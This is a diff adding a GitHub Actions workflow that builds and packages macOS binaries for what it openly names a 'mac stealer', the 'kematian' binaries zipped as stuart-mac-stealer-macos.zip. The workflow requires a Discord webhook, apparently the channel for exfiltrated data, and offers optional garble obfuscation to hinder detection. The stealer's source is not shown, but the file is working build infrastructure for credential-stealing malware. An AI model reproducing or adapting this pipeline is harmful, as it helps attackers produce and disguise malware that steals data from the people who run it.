@@ -1,0 +1,97 @@
+name: macOS Build (CGO)
+
+on:
+  workflow_dispatch:
+    inputs:
+      discord_webhook:
+        description: "Discord webhook URL (overrides repo secret DISCORD_WEBHOOK)"
+        type: string
+        default: ""
+      obfuscate:
+        description: "Obfuscate with garble"
+        type: boolean
+        default: false
+  push:
+    branches: [main]
+    tags: ["v*"]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: macos-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Setup Go
+        uses: actions/setup-go@v5
+        with:
+          go-version-file: go.mod
+          cache: true
+          cache-dependency-path: go.sum
+
+      - name: Verify Xcode / CGO toolchain
+        run: |
+          xcode-select -p
+          clang --version
+
+      - name: Install garble
+        if: github.event_name == 'workflow_dispatch' && inputs.obfuscate == true
+        run: go install mvdan.cc/garble@latest
+
+      - name: Resolve Discord webhook
+        id: webhook
+        env:
+          INPUT_WEBHOOK: ${{ github.event_name == 'workflow_dispatch' && inputs.discord_webhook || '' }}
+          SECRET_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
+        run: |
+          set -euo pipefail
+          WEBHOOK="${INPUT_WEBHOOK:-}"
+          if [ -z "${WEBHOOK}" ]; then
+            WEBHOOK="${SECRET_WEBHOOK:-}"
+          fi
+          if [ -z "${WEBHOOK}" ]; then
+            echo "::error::Discord webhook required. Add repo secret DISCORD_WEBHOOK or pass discord_webhook when running the workflow."
+            exit 1
+          fi
+          if [[ ! "${WEBHOOK}" =~ ^https://discord\.com/api/webhooks/ ]]; then
+            echo "::warning::Webhook does not look like a standard Discord URL — continuing anyway."
+          fi
+          echo "webhook_set=true" >> "${GITHUB_OUTPUT}"
+          echo "::add-mask::${WEBHOOK}"
+          echo "DISCORD_WEBHOOK=${WEBHOOK}" >> "${GITHUB_ENV}"
+
+      - name: Build macOS binaries (CGO)
+        env:
+          CGO_ENABLED: "1"
+          OBFUSCATE: ${{ github.event_name == 'workflow_dispatch' && inputs.obfuscate && 'true' || 'false' }}
+        run: |
+          set -euo pipefail
+          chmod +x scripts/build-macos.sh
+          ./scripts/build-macos.sh
+
+          for bin in dist/kematian-darwin-arm64 dist/kematian-darwin-amd64; do
+            echo "Verifying ${bin}"
+            file "${bin}"
+            if ! go version -m "${bin}" 2>/dev/null | grep -q 'build[[:space:]]CGO_ENABLED=1'; then
+              echo "::error::${bin} was not built with CGO_ENABLED=1" >&2
+              exit 1
+            fi
+          done
+
+          chmod +x dist/kematian-darwin-arm64 dist/kematian-darwin-amd64
+          cd dist
+          zip -j stuart-mac-stealer-macos.zip kematian-darwin-arm64 kematian-darwin-amd64
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: stuart-mac-stealer-macos
+          path: |
+            dist/kematian-darwin-arm64
+            dist/kematian-darwin-amd64
+            dist/stuart-mac-stealer-macos.zip
+          if-no-files-found: error
